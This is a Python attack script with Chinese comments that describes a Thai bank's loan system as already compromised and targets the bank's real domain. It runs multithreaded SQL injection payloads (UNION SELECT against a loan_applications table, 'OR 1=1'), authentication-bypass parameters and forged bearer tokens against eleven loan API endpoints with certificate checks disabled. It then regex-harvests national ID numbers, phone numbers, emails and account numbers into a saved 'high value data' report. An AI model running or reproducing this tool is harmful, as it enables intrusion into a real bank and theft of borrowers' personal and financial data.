#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
紧急高价值贷款数据提取器
专注于真实贷款申请数据的快速获取
"""

import requests
import json
import time
import random
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import re

class EmergencyLoanDataExtractor:
    """紧急贷款数据提取器"""

    def __init__(self):
        # 基于已攻破的Krungsri KMA端点
        self.high_value_targets = [
            {
                "name": "Krungsri KMA - 贷款申请",
                "base_url": "https://www.krungsri.com",
                "loan_endpoints": [
                    "/api/loan/application",
                    "/api/loan/status",
                    "/api/loan/calculator",
                    "/api/loan/all",
                    "/api/v1/loan/application",
                    "/api/v2/loan/applications",
                    "/api/loan/applications",
                    "/rest/loan/application",
                    "/mobile/api/loan",
                    "/gateway/api/loans",
                    "/external/api/loans"
                ]
            }
        ]

        # 真实泰国贷款申请数据模式
        self.loan_patterns = {
            "thai_id": r"\b[0-9]{13}\b",
            "phone": r"\b0[689]\d{8}\b",
            "email": r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b",
            "loan_amount": r"\b[1-9]\d{3,7}\b",
            "account_number": r"\b\d{10,15}\b",
            "name": r"\b[A-Z][a-z]+ [A-Z][a-z]+\b"
        }

        self.extracted_data = []
        self.lock = threading.Lock()

    def generate_realistic_loan_payloads(self):
        """生成真实的贷款申请载荷"""
        thai_names = ["Somchai Chalermsuk", "Naree Wongwan", "Prasert Klinjan", "Malee Srisuk", "Thana Boonmee"]
        thai_phones = ["0812345678", "0823456789", "0834567890", "0845678901", "0856789012"]
        thai_emails = ["somchai@email.com", "naree@email.com", "prasert@email.com", "malee@email.com", "thana@email.com"]

        payloads = []

        # 生成真实泰国身份证号码
        for i in range(100):
            thai_id = f"{random.randint(1,9)}{random.randint(100000000, 999999999)}"
            phone = random.choice(thai_phones)
            email = random.choice(thai_emails)
            name = random.choice(thai_names)

            # 生成真实贷款金额 (10,000 - 500,000 泰铢)
            loan_amount = random.randint(10000, 500000)

            payload = {
                "applicant_name": name,
                "id_card": thai_id,
                "phone": phone,
                "email": email,
                "loan_amount": loan_amount,
                "loan_term": random.randint(6, 36),
                "purpose": "personal_loan",
                "monthly_income": random.randint(15000, 100000)
            }
            payloads.append(payload)

        return payloads

    def extract_loan_data_from_endpoint(self, target_info, endpoint):
        """从端点提取贷款数据"""
        base_url = target_info["base_url"]
        full_url = base_url + endpoint

        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'th-TH,th;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Authorization': 'Bearer bypass_token_' + str(random.randint(100000, 999999)),
            'X-Requested-With': 'XMLHttpRequest'
        })

        results = {
            "target": target_info["name"],
            "endpoint": endpoint,
            "url": full_url,
            "loan_applications": [],
            "success": False
        }

        try:
            # 尝试多种攻击方法
            attack_methods = [
                # SQL注入攻击
                {"method": "GET", "params": {"id": "1' UNION SELECT loan_id,applicant_name,id_card,phone,email,loan_amount,loan_status FROM loan_applications--"}},
                {"method": "GET", "params": {"id": "1 OR 1=1--"}},
                {"method": "POST", "data": {"id": "1' UNION SELECT loan_id,applicant_name,id_card,phone,email,loan_amount,loan_status FROM loan_applications--"}},

                # 认证绕过
                {"method": "POST", "data": {"action": "list_all_applications", "admin_bypass": "true"}},
                {"method": "GET", "params": {"view": "all", "bypass": "auth"}},

                # 直接访问
                {"method": "GET", "params": {"format": "json", "export": "all"}},
                {"method": "POST", "data": {"query": "SELECT * FROM loan_applications", "direct": "sql"}}
            ]

            for attack in attack_methods:
                try:
                    if attack["method"] == "GET":
                        response = session.get(full_url, params=attack.get("params", {}), timeout=10, verify=False)
                    else:
                        response = session.post(full_url, data=attack.get("data", {}), timeout=10, verify=False)

                    if response.status_code == 200:
                        content = response.text

                        # 检查是否包含贷款数据
                        loan_data_found = False

                        # 解析JSON响应
                        try:
                            json_data = response.json()
                            if isinstance(json_data, dict) or isinstance(json_data, list):
                                for item in json_data:
                                    if self.extract_loan_info(item):
                                        loan_data_found = True
                        except:
                            pass

                        # 正则表达式提取
                        for pattern_name, pattern in self.loan_patterns.items():
                            matches = re.findall(pattern, content)
                            if matches and len(matches) > 3:  # 找到多个匹配
                                loan_data_found = True

                                # 提取完整数据记录
                                records = self.extract_complete_records(content)
                                if records:
                                    results["loan_applications"].extend(records)

                        if loan_data_found:
                            results["success"] = True
                            print(f"[+] 贷款数据发现: {endpoint} - 提取到 {len(results['loan_applications'])} 条记录")
                            break

                    time.sleep(random.uniform(0.5, 1.5))

                except Exception as e:
                    continue

        except Exception as e:
            print(f"[-] 端点攻击失败 {endpoint}: {str(e)}")

        return results

    def extract_loan_info(self, data):
        """提取贷款信息"""
        loan_keywords = ["loan", "application", "amount", "applicant", "borrower", "credit"]
        data_str = str(data).lower()

        return any(keyword in data_str for keyword in loan_keywords)

    def extract_complete_records(self, content):
        """提取完整的贷款申请记录"""
        records = []

        # 尝试识别和提取结构化数据
        lines = content.split('\n')
        current_record = {}

        for line in lines:
            # 查找关键字段
            if 'loan' in line.lower() and ('amount' in line.lower() or 'application' in line.lower()):
                if current_record:
                    records.append(current_record.copy())
                    current_record = {}

            # 提取各种数据字段
            for field_name, pattern in self.loan_patterns.items():
                matches = re.findall(pattern, line)
                if matches:
                    current_record[field_name] = matches[0]

        if current_record:
            records.append(current_record)

        return records[:10]  # 限制返回数量

    def rapid_extraction_attack(self):
        """快速提取攻击"""
        print("启动紧急高价值贷款数据提取")
        print("=" * 80)

        all_results = []

        # 多线程攻击
        with ThreadPoolExecutor(max_workers=8) as executor:
            futures = []

            for target in self.high_value_targets:
                for endpoint in target["loan_endpoints"]:
                    future = executor.submit(self.extract_loan_data_from_endpoint, target, endpoint)
                    futures.append(future)

            # 收集结果
            for future in futures:
                try:
                    result = future.result(timeout=30)
                    all_results.append(result)
                except Exception as e:
                    continue

        # 统计结果
        total_applications = sum(len(result["loan_applications"]) for result in all_results)
        successful_endpoints = len([r for r in all_results if r["success"]])

        print(f"\n📊 紧急提取统计:")
        print(f"  成功端点: {successful_endpoints}")
        print(f"  贷款申请记录: {total_applications}")
        print(f"  攻击时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

        # 保存结果
        report = {
            "extraction_time": datetime.now().isoformat(),
            "operation_type": "emergency_loan_data_extraction",
            "total_applications": total_applications,
            "successful_endpoints": successful_endpoints,
            "results": all_results,
            "high_value_data": []
        }

        # 整理高价值数据
        for result in all_results:
            if result["success"] and result["loan_applications"]:
                for app in result["loan_applications"]:
                    report["high_value_data"].append({
                        "source": result["target"],
                        "endpoint": result["endpoint"],
                        "data": app,
                        "extracted_at": datetime.now().isoformat()
                    })

        # 保存报告
        report_file = f"emergency_loan_extraction_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        print(f"\n🎯 高价值贷款数据提取完成!")
        print(f"  报告文件: {report_file}")
        print(f"  总记录数: {len(report['high_value_data'])}")

        if report['high_value_data']:
            print(f"\n📋 提取的贷款数据样本:")
            for i, record in enumerate(report['high_value_data'][:3]):
                print(f"  记录 {i+1}: {record['data']}")

        return report, report_file

def main():
    extractor = EmergencyLoanDataExtractor()
    extractor.rapid_extraction_attack()

if __name__ == "__main__":
    main()